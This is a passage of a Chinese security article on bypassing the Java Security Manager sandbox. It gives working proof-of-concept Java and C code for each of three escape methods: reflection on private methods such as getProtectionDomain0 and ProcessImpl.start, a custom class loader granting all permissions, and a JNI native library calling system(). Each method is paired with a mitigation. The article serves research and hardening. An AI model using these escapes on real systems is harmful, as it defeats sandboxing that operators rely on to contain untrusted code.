        }
        private native java.security.ProtectionDomain getProtectionDomain0();
getProtectionDomain方法中，先检查了权限，然后再调用私有的原生方法getProtectionDomain0来完成getProtectionDomain。那么我们完全可以通过反射直接运行getProtectionDomain0方法，从而绕过对getProtectionDomain方法的权限检查。代码如下：
    public static void setHasAllPerm0(){
            StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
            //遍历栈帧
            for (StackTraceElement stackTraceElement : stackTraceElements) {
                try {
                    Class clz=Class.forName(stackTraceElement.getClassName());
                    //利用反射调用getProtectionDomain0方法
                    Method getProtectionDomain=clz.getClass().getDeclaredMethod("getProtectionDomain0",null);
                    getProtectionDomain.setAccessible(true);
                    ProtectionDomain pd=(ProtectionDomain) getProtectionDomain.invoke(clz);
                    if(pd!=null){
                        Field field=pd.getClass().getDeclaredField("hasAllPerm");
                        field.setAccessible(true);
                        field.set(pd,true);
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
            exec("calc");
        }
运行，如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。
java.policy:
    grant {
        permission java.lang.reflect.ReflectPermission "suppressAccessChecks";
        permission java.lang.RuntimePermission "accessDeclaredMembers";
    };
exp地址：
修复方法：不授予accessDeclaredMembers权限和suppressAccessChecks权限。
然而在java中，反射是一个非常常见的操作，如果由于业务需要，无法禁用反射，可以设置禁止反射的方法和变量的黑名单。还记得上面无法反射System类中security的原因吗？在sun.reflect.Reflection中定义了静态的methodFilterMap和fieldMethodMap，在这里面的方法和变量禁止反射。sun.reflect.Reflection还提供了几个方法，可以往methodFilterMap和fieldMethodMap中添加自定义的黑名单。代码如下：
        public static synchronized void registerFieldsToFilter(Class var0, String... var1) {
            fieldFilterMap = registerFilter(fieldFilterMap, var0, var1);
        }
        public static synchronized void registerMethodsToFilter(Class var0, String... var1) {
            methodFilterMap = registerFilter(methodFilterMap, var0, var1);
        }
这样，只需要在加载恶意代码之前，把禁止反射的黑名单加入这两个map即可。
使用这种方式时，需要注意，有些方法的实现是，在public方法里面调用security
manager检查权限，然后调用一个protect或者private方法实现功能。这样，攻击者可以直接反射实现功能的方法，绕过security
manager的检查。例如平时我们调用`Runtime.getRuntime().exec(command)`，调用链如下：
        public Process exec(String[] cmdarray, String[] envp, File dir)
            throws IOException {
            return new ProcessBuilder(cmdarray)
                .environment(envp)
                .directory(dir)
                .start();
        }
这里执行命令的功能是调用ProcessBuilder实现的。我们跟进去看一下start方法：
        public Process start() throws IOException {
            //省略部分代码
            SecurityManager security = System.getSecurityManager();
            if (security != null)
                security.checkExec(prog);
            //在这里检查了是否有执行命令的权限
            //省略部分代码
            try {
                return ProcessImpl.start(cmdarray,
                                         environment,
                                         dir,
                                         redirects,
                                         redirectErrorStream);
            }
            //最后调用ProcessImpl.start实现这个功能。
            //省略部分代码
        }
从代码中我们看到，正如前面所说，完成功能的是ProcessImpl.start方法，而在这个方法调用之前，security
manager就已经完成了检测，于是，反射这个方法，调用它，就可以绕过检测。代码如下
        public static void executeCommandWithReflection(String command){
            try {
                Class clz = Class.forName("java.lang.ProcessImpl");
                Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
                method.setAccessible(true);
                method.invoke(clz,new String[]{command},null,null,null,false);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
###  创建类加载器绕过java security manager
如前面所说，一个类的ProtectionDomain在这个类被类加载器加载时初始化，如果我们能自定义一个类加载器，加载一个恶意类，并且把它的ProtectionDomain里面的权限初始化成所有权限，这个恶意类不就可以有所有权限了吗？即便如此，这个恶意类被调用时，它仅仅是栈中的一个栈帧，在它下面的栈帧对应的权限仍是policy文件指定的权限。
这个时候就是doPrivileged发挥作用的时候了，如上面所说，AccessController会自顶向下遍历栈帧，如果遍历到doPrivileged，它会检查到调用doPrivileged方法的栈帧为止。只要我们在恶意类中调用doPrivileged方法，AccessController只会向下遍历检查到恶意类所在的栈帧，而恶意类对应的权限是所有权限，这样就可以绕过Java
Security Manager。
java.policy如下，这里需要读class文件，所以需要读文件权限
    grant{
        permission java.lang.RuntimePermission "createClassLoader";
        permission java.io.FilePermission ">", "read";
    };
恶意类：com.evil.EvilClass
    public class EvilClass {
        static{
            //在doPrivileged中执行恶意操作
            AccessController.doPrivileged(new  PrivilegedAction()  {
                @Override
                public  Object run() {
                    try {
                        Process process = Runtime.getRuntime().exec("calc");
                        return null;
                    }catch (Exception e){
                        e.printStackTrace();
                        return null;
                    }
                }
            });
        }
    }
自定义类加载器：
    public class MyClassLoader extends ClassLoader
    {
        //.....省略部分代码
        @Override
        protected Class findClass(String name) throws ClassNotFoundException
        {
            File file = getClassFile(name);
            try
            {
                //获取byte数组的字节码
                byte[] bytes = getClassBytes(file);
                //这里没有调用父类的defineClass方法，而是调用了下面的defineClazz方法。
                Class c = defineClazz(name, bytes, 0, bytes.length);
                return c;
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
            return super.findClass(name);
        }
        //在这个自定义的defineClazz方法中
        protected final Class defineClazz(String name, byte[] b, int off, int len)
                throws ClassFormatError
        {
            try {
                PermissionCollection pc=ClassLoader.class.getProtectionDomain().getPermissions();
                //赋予ClassLoader类的权限，其实就是所有权限
                ProtectionDomain pd=new ProtectionDomain(new CodeSource(null, (Certificate[]) null),
                        pc, this, null);
                //调用父类的defineClass完成功能
                return this.defineClass(name, b, off, len, pd);
            }catch (Exception e){
                return null;
            }
        }
        //.....省略部分代码
    }
在findClass方法中，我们并没有直接调用父类的defineClass方法，因为在父类的defineClass方法中：
java.lang.ClassLoader line639
        protected final Class defineClass(String name, byte[] b, int off, int len)
            throws ClassFormatError
        {
            //最后一个参数是传入的ProtectionDomain
            //这个函数的实现抄录在下面
            return defineClass(name, b, off, len, null);
        }
跟一下defineClass
        protected final Class defineClass(String name, byte[] b, int off, int len,
                                             ProtectionDomain protectionDomain)
            throws ClassFormatError
        {
            //preDefineClass的实现在下面
            protectionDomain = preDefineClass(name, protectionDomain);
            String source = defineClassSourceLocation(protectionDomain);
            Class c = defineClass1(name, b, off, len, protectionDomain, source);
            postDefineClass(c, protectionDomain);
            return c;
        }
跟一下preDefineClass
        private ProtectionDomain preDefineClass(String name,
                                                ProtectionDomain pd)
        {
            if (!checkName(name))
                throw new NoClassDefFoundError("IllegalName: " + name);
            // Note:  Checking logic in java.lang.invoke.MemberName.checkForTypeAlias
            // relies on the fact that spoofing is impossible if a class has a name
            // of the form "java.*"
            if ((name != null) && name.startsWith("java.")) {
                throw new SecurityException
                    ("Prohibited package name: " +
                     name.substring(0, name.lastIndexOf('.')));
            }
            if (pd == null) {
                pd = defaultDomain;
            }
            if (name != null) checkCerts(name, pd.getCodeSource());
            return pd;
        }
传入的默认ProtectionDomain是null。我们调用了defineClazz方法，赋予了加载的类所有的权限，然后传入defineClass方法，完成类加载过程。如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java
security manager机制，逃逸沙箱。
java.policy:
    grant{
        permission java.lang.RuntimePermission "createClassLoader";
        permission java.io.FilePermission ">", "read";
    };
exp地址：
修复方法：禁止createClassLoader
###  本地方法调用绕过Java Security Manager
Java Security Manager是在java核心库中的一个功能，而java中native方法是由jvm执行的，不受java security
manager管控。因此，我们可以调用java native方法，绕过java security manager。
java.policy
    grant{
    permission java.lang.RuntimePermission "loadLibrary.*";
    permission java.io.FilePermission "/root/-", "read";
    };
声明一个native方法：
    package com.evil;
    public class EvilMethodClass {
        //加载动态链接库
        static {
            System.load("/root/libEvilMethodClass.so");
        }
        //声明一个native方法
        public static native String evilMethod(String name);
    }
生成.h头
    javac src/com/evil/EvilMethodClass.java -d ./bin
    javah -jni -classpath ./bin -d ./jni com.evil.EvilMethodClass
    javah -jni -classpath ./bin -o EvilMethodClass.h com.evil.EvilMethodClass
新建EvilMethodClass.c
    #include "com_evil_EvilMethodClass.h"
    #include
    #ifdef __cplusplus
    extern "C"
    {
    #endif
    JNIEXPORT jstring JNICALL Java_com_evil_EvilMethodClass_evilMethod(
            JNIEnv *env, jclass cls, jstring j_str)
    {
        const char *c_str = NULL;
        char buff[128] = { 0 };
        c_str = (*env)->GetStringUTFChars(env, j_str, NULL);
        if (c_str == NULL)
        {
            printf("out of memory.n");
            return NULL;
        }
        //在这里执行系统命令
        system(c_str);
        (*env)->ReleaseStringUTFChars(env, j_str, c_str);
        return (*env)->NewStringUTF(env, buff);
    }
    #ifdef __cplusplus
    }
    #endif
编译，生成动态链接库
    gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared EvilMethodClass.c -o libEvilMethodClass.so
放到/root/目录下  
Poc.java
    public class Poc {
        public static void main(String[] args){
            EvilMethodClass.evilMethod("whoami");
        }
    }
我编译了Linux下的so，如下图所示，同样policy文件没有赋予文件的执行权限，却执行whoami成功，成功绕过java security
manager机制，逃逸沙箱。
exp如下：
修复方案：不授予loadLibrary权限
## 0x04 第三方java security manager的安全性
从上面的绕过方法来看，在给不可信的代码授予权限时需要非常谨慎，有些权限一旦授予，就可能导致整个java security manager体系的绕过。
默认java security manager的policy是白名单模式的，也就是说，只有在policy文件出现的权限才是被授予的。而有些第三方的java
security manager支持黑名单模式，这样更加危险。例如[pro-grade](http://pro-grade.sourceforge.net/)，它支持黑名单模式，实现了deny语法。这意味着如果没有把上面提到的这些危险的权限禁止的话，绕过java
security manager将会是非常容易的。
## 0x05 Reference
  * 
  * 
  * 
这篇文章中使用的绕过的代码都已上传到[github](https://github.com/c0d3p1ut0s/java-security-manager-bypass/)。
审核人：yiwang 编辑：边边